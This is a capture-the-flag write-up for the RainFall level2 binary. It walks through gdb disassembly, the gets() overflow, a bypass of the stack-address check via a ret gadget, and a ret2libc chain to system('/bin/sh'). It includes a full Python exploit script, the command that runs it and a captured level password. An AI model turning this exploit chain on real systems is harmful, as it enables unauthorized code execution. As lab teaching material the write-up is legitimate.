using gdb:
we need to check the functions used in the program:

------------------------------------
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
(gdb)
------------------------------------

so what we need to consider are the functions main and p

let's disas the main function

------------------------------------
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:		push   ebp
   0x08048540 <+1>:		mov    ebp,esp
   0x08048542 <+3>:		and    esp,0xfffffff0
   0x08048545 <+6>:		call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
(gdb)
------------------------------------

so the main function literally call the p function

so now we need to disas the p function

------------------------------------
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:		push   ebp
   0x080484d5 <+1>:		mov    ebp,esp
   0x080484d7 <+3>:		sub    esp,0x68
   0x080484da <+6>:		mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
(gdb)
------------------------------------

in p function we notice it has a gets() function that is vulenerable so we need to use
it to find the overflow

there is:
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
in the p function and it compares with anything that start with b and prevent us from
pointing on the stack so we need to do something about it

in general our goal is to get a shell code to cget the flag from it
the program has no shell code so we gonna use somwthing called ret2lib
to make the program redirect to a function in libc that's within our program
by default

firstly we need yo get the offset of the overflow. using python we found the offset in 80:

------------------------------------
(gdb) run
Starting program: /home/user/level2/level2
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVV

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb)
------------------------------------

the eip is in 80 deducted from the segfault at 0x55555555 which means the alphabet U

after adding the 80 character we need to bypass the cmp which stop us every time from using the stack
so we can jump directly to the ret address of p function 0x0804853e

then after it we need to get the system address and the "/bin/sh" address on libc bc that's how 
we gonna inject our shell

we get the system address using:

------------------------------------
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb)
------------------------------------

so the system address is 0xb7e6b060.

and to get the "/bin/sh"address we use:

------------------------------------
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
(gdb)
------------------------------------

so the "/bin/sh" address is 0xb7f8cc58

the steps would be like this :
-- > inject the 80 character
-- > jump to the ret of p function to bypass the cmp
-- > get system address within the program
-- > add garbage so it overflow the system call
-- > get the "/bin/sh" address

--[character * 80] + [ret of p] + [system address] + [garbage] + [address of sh]--


i used a python script to make it easy for me to inject the address

-------------script--------------
import struct
padding = "A" * 80

ret = struct.pack("I", 0x0804853e)
system = struct.pack("I", 0xb7e6b060)
garbage = "A" * 4
sh = struct.pack("I", 0xb7f8cc58)

print padding + ret + system + garbage + sh
---------------------------------

level2@RainFall:~$ (python /tmp/test.py; cat -) | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��AAAAX��
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
